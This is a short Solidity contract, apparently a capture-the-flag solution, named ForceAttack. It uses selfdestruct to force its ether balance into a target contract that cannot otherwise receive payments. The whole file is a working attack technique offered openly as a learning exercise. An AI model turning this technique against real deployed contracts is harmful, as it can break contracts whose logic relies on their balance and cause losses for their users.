// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    address forceContractAddress;

    constructor(address _forceContractAddress) public {
        forceContractAddress = _forceContractAddress;
    }

    function attackForceContract() public {
        selfdestruct(payable(forceContractAddress));
    }
}
